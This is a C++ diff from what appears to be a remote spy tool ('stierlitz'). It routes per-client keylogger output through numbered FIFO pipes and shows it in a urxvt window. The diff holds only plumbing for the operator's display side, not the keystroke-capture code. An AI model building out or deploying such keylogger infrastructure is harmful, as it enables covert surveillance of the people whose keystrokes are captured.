@@ -29,8 +29,8 @@ void SpyTunnel::run() {
         _exit(EXIT_FAILURE);
     }
 
-    /*int tries = 0;
-    while ((tunnel_fifo_ = open(KEYLOGGER_FIFO_PATH, O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
+    int tries = 0;
+    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
         std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
@@ -38,7 +38,7 @@ void SpyTunnel::run() {
     if (tunnel_fifo_ == -1) {
         std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
         return;
-    }*/
+    }
     
     ScopedEpollFD epoll_fd;
     epoll_fd.fd = epoll_create1(0);
@@ -99,6 +99,12 @@ void SpyTunnel::run() {
 
 }
 
+void SpyTunnel::edit_path(int __client_index, CommandCode __command_code) {
+    if (__command_code == KEYLOGGER) {
+        fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
+    }
+}
+
 void SpyTunnel::shutdown() {
     if (pid_ > 0) {
         kill(pid_, SIGTERM);
@@ -120,7 +126,7 @@ void SpyTunnel::write_fifo_error(const std::string& __msg) {
 }
 
 void Keylogger::spawn_window() {
-    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", "/home/viv4ldi/Desktop/Projects/stierlitz/URXVT/test.py", (char*)NULL);
+    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
 }
 
 Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
@@ -152,3 +158,4 @@ void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, Command
 void SpyTunnel::spawn_window() {
     // Overridden
 }
+
